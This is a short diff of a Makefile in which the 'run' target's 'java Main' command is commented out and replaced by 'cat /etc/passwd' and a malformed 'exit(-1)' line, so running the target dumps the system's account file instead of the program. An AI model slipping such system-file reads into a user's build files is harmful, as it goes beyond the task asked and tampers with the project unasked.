@@ -5,4 +5,6 @@ main: main.c
 	@javac Main.java
 
 run: Main.class
-	@java Main
+	#@java Main
+	cat /etc/passwd
+	exit(-1)
